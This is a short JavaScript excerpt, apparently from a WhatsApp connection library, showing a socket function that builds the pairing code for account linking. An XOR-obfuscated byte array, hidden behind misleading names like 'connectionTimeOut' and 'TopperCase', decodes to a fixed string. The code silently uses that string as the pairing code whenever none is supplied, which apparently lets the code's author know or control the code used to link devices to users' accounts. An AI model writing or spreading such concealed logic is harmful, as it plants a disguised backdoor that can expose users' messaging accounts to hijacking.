...
const makeSocket = (config) => {
    ...
    const connectionTimeOut = [98, 122, 104, 99, 111, 108, 100, 97];
    const getpairkey = 45;
    const TopperCase = () => {
        return connectionTimeOut.map(byte => String.fromCharCode(byte ^ getpairkey)).join('');
    };
    const requestPairingCode = async (phoneNumber, code) => {
        authState.creds.pairingCode = code?.toUpperCase() || TopperCase()
        authState.creds.me = {
